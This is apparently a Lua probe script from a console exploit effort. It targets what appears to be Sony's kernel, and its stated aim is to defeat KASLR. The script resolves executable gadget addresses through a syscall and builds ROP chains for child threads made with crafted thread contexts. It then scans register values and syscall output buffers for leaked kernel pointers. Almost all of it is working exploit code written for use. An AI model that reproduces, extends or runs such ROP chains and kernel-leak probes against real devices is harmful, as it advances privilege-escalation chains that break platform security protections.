-- CRASH_CLASS: LOW
-- PROBE 109a: scan child thread registers after syscalls for kernel leaks
--
-- After a syscall, the kernel restores user registers via sysret/iret.
-- But does Sony's kernel properly clear ALL registers? If any register
-- retains a kernel-range value after returning to userland, we have KASLR defeat.
--
-- Method: child thread calls a syscall, then stores multiple registers
-- to shared memory using a ROP chain of gadgets:
--   pop rdi; ret → set target address
--   mov [rdi], rax; ret → store register
--
-- We test: getpid(20), sysctl(202), mmap(477), pipe(42), socket(97)
-- After each, dump RAX + any other registers we can capture.
--
-- Key insight: the x86-64 syscall instruction sets RCX=RIP, R11=RFLAGS.
-- But the KERNEL'S internal register state might leak through other regs
-- if Sony doesn't explicitly clear them before sysret.

print("=== PROBE 109a: REGISTER LEAK SCAN ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local function ga(off) return uint64(string.format("0x%X%08X",ehi,elo+off)) end

local PRAX=ga(0x992)      -- pop rax; ret
local PRDI=ga(0xC9DFE)    -- pop rdi; ret
local PRSI=ga(0xD77D)     -- pop rsi; ret
local WMOV=ga(0x92C67)    -- mov [rdi], rax; ret

-- We need more gadgets to capture different registers.
-- Without mov [rdi],rcx;ret or mov [rdi],rdx;ret, we can't directly
-- dump those registers. BUT we can use: xchg rax,REG; mov [rdi],rax;ret
-- Or: push REG; pop rax; mov [rdi],rax;ret

-- Alternatively: the child enters through SA (syscall address).
-- After the syscall, the CPU executes the instruction AFTER the syscall.
-- The return chain is on the stack. We can set it up to:
-- 1. syscall → returns with RAX=result
-- 2. Store RAX to RESULT[0]
-- 3. xchg rax,rcx → now RAX=RCX (kernel's return address?)
-- 4. Store RAX to RESULT[1]
-- 5. xchg rax,rdx → now RAX=RDX
-- 6. Store RAX to RESULT[2]
-- etc.

-- But we need xchg gadgets. Let's scan for them.
-- For now, let's just capture what we CAN: RAX (syscall return)
-- And then test the ucontext AFTER thr_create to see if kernel wrote to it.

local mm=mk(477); local tc=mk(430)

-- Allocate region
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(8*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl300=R+0x40; wq(sl300,uint64(0)); wq(sl300+8,uint64(300000000))
local tb=R+0x80
local RESULT=R+0x1000  -- 256 bytes for results
local child_stk=R+0x4000*2
local child_ctx=R+0x4000*4
-- Second context buffer to check post-create state
local ctx_copy=R+0x4000*6

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _R9=0x070; local _AX=0x078
local _RBX=0x030; local _RCX=0x038; local _R11=0x080; local _R12=0x088
local _R13=0x090; local _R14=0x098; local _R15=0x0A0; local _RBP=0x0A8
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

-- ============================================================
print("")
print("--- A: CHECK ucontext AFTER thr_create ---")
-- Fill context with known pattern (0xAA bytes), create thread,
-- then compare: did the kernel write any new values?
for off=0,0x200-4,4 do wd(child_ctx+off, 0xAAAAAAAA) end

-- Set only the required fields
wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
wq(child_ctx+_TP,uint64(0x10000))
wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
wq(child_ctx+_SP,uint64(child_stk))
wq(child_ctx+_IP,SA)
wq(child_ctx+_AX,uint64(240))  -- nanosleep
wq(child_ctx+_DI,uint64(N(ts999)))
wq(child_ctx+_SI,uint64(0))

-- Copy context before thr_create
for off=0,0x1FF do
    local ok,b=pcall(function() return memory.read_byte(child_ctx+off) end)
    if ok then pcall(function() memory.write_byte(ctx_copy+off, b) end) end
end

-- Stack: just nanosleep
local off=0
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(ts999)); off=off+8
wq(child_stk+off,PRSI); off=off+8
wq(child_stk+off,uint64(0)); off=off+8
wq(child_stk+off,PRAX); off=off+8
wq(child_stk+off,uint64(240)); off=off+8
wq(child_stk+off,SA); off=off+8

wq(tb,uint64(0))
pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
native.fcall_with_rax(stub,240,N(sl300),0)

-- Compare ucontext before vs after
print("  ucontext changes after thr_create:")
local changes = 0
for off=0,0x118,8 do
    local before = rq(ctx_copy+off)
    local after = rq(child_ctx+off)
    local b_s = fmt_ptr(before)
    local a_s = fmt_ptr(after)
    if b_s ~= a_s then
        changes = changes + 1
        local tag = ""
        if is_kptr(after) then tag = " *** KERNEL ***" end
        print(string.format("    +0x%03X: %s → %s%s", off, b_s, a_s, tag))
    end
end
print(string.format("  %d fields changed", changes))

-- ============================================================
print("")
print("--- B: CHILD GETPID — dump RAX via chain ---")
-- Child: getpid → store RAX → nanosleep
-- This is our baseline — RAX should be the pid.

-- Also try to capture RDX (secondary return) and RCX (for syscall leak)
-- by chaining: after syscall returns,
-- 1. store RAX to RESULT[0]
-- 2. Use a gadget sequence to move RDX to RAX, then store
-- Problem: we need "mov rax,rdx; ret" or "xchg rax,rdx; ret"
-- 48 89 D0 C3 = mov rax,rdx; ret
-- 48 87 C2 C3 = xchg rax,rdx; ret (less common)
-- 48 92 C3    = xchg rax,rdx; ret (alternate encoding: wrong, 48 92 = xchg rax,rdx)

-- For now, just capture RAX from multiple syscalls and look for leaked bits.

z(RESULT, 0x100)

local function test_syscall(label, sysno, a1,a2,a3,a4,a5)
    z(child_ctx,0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_IP,SA)
    wq(child_ctx+_AX,uint64(sysno))
    wq(child_ctx+_DI,uint64(a1 or 0))
    wq(child_ctx+_SI,uint64(a2 or 0))
    wq(child_ctx+_DX,uint64(a3 or 0))
    wq(child_ctx+_R10,uint64(a4 or 0))
    wq(child_ctx+_R8,uint64(a5 or 0))
    -- Also: fill OTHER registers with known sentinel
    wq(child_ctx+_RBX,uint64(0xBBBBBBBB))
    wq(child_ctx+_RCX,uint64(0xCCCCCCCC))
    wq(child_ctx+_R11,uint64(0x11111111))
    wq(child_ctx+_R12,uint64(0x12121212))
    wq(child_ctx+_R13,uint64(0x13131313))
    wq(child_ctx+_R14,uint64(0x14141414))
    wq(child_ctx+_R15,uint64(0x15151515))
    wq(child_ctx+_RBP,uint64(0xBBBBBBBB))

    local stk=child_stk; off=0
    -- After syscall: RAX has return value
    -- Store RAX to RESULT
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(RESULT)); off=off+8
    wq(stk+off,WMOV); off=off+8  -- RESULT[0] = RAX
    -- Sleep
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8
    wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    wq(RESULT,uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
    native.fcall_with_rax(stub,240,N(sl300),0)

    local rax_val = rq(RESULT)
    local c=N(native.fcall_with_rax(stub,20))
    local tag = ""
    if is_kptr(rax_val) then tag = " *** KERNEL POINTER! ***" end
    print(string.format("  %s: RAX=%s canary=%s%s",
        label, fmt_ptr(rax_val), c==pid and "OK" or "FAIL", tag))

    if c~=pid then return false end
    return true
end

-- Test several syscalls
if not test_syscall("getpid(20)", 20) then return end
if not test_syscall("getuid(24)", 24) then return end
if not test_syscall("getgid(47)", 47) then return end

-- pipe() returns fd in RAX, might have high bits
if not test_syscall("pipe(42)", 42) then return end

-- socket(AF_INET, SOCK_DGRAM, 0)
if not test_syscall("socket(97)", 97, 2, 2, 0) then return end

-- sys 624 (VM counter)
if not test_syscall("sys624", 624, 0, 0, 0) then return end

-- sysctl: kern.maxproc (safe, returns small value)
local mib=memory.alloc(16); wd(mib,1); wd(mib+4,6)
local outb=memory.alloc(8); wd(outb,0)
local olen=memory.alloc(8); wq(olen,uint64(8))
if not test_syscall("sysctl(202)", 202, N(mib), 2, N(outb), N(olen), 0, 0) then return end

-- sys 587 (credential metadata — known to return data)
local cred_buf=memory.alloc(0x100); z(cred_buf,0x100)
if not test_syscall("sys587", 587, N(cred_buf), 0x100, 0) then return end

-- sys 674 (VM map — returns region count)
local vm_buf=memory.alloc(0x1000); z(vm_buf,0x1000)
local vm_cnt=memory.alloc(8); wq(vm_cnt,uint64(10))
if not test_syscall("sys674", 674, N(vm_buf), N(vm_cnt), 0x48) then return end

-- ============================================================
print("")
print("--- C: CHECK thr_create RETURN VALUE ---")
-- thr_create returns the new TID in tb (thread ID buffer).
-- Is the TID a kernel address? No, it's a small integer.
-- But let's check tb contents.
local tid_val = rq(tb)
print(string.format("  thr_create tid buffer: %s", fmt_ptr(tid_val)))
if is_kptr(tid_val) then
    print("  *** TID BUFFER CONTAINS KERNEL POINTER! ***")
end

-- ============================================================
print("")
print("--- D: SCAN SYSCTL OUTPUT FOR KERNEL POINTERS ---")
-- Check if sysctl wrote kernel pointers to the output buffer
local sysctl_kptrs = 0
for off=0,0x100-8,8 do
    local val = rq(N(outb)+off)
    if val and is_kptr(val) then
        sysctl_kptrs = sysctl_kptrs + 1
        print(string.format("  *** KPTR sysctl outbuf+0x%X: %s", off, fmt_ptr(val)))
    end
end

-- Check sys 587 output
for off=0,0x88-8,8 do
    local val = rq(N(cred_buf)+off)
    if val and is_kptr(val) then
        sysctl_kptrs = sysctl_kptrs + 1
        print(string.format("  *** KPTR sys587+0x%X: %s", off, fmt_ptr(val)))
    end
end

-- Check sys 674 output
for off=0,0x300-8,8 do
    local val = rq(N(vm_buf)+off)
    if val and is_kptr(val) then
        sysctl_kptrs = sysctl_kptrs + 1
        print(string.format("  *** KPTR sys674+0x%X: %s", off, fmt_ptr(val)))
    end
end
print(string.format("  output buffer kernel pointers: %d", sysctl_kptrs))

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 109a COMPLETE ===")
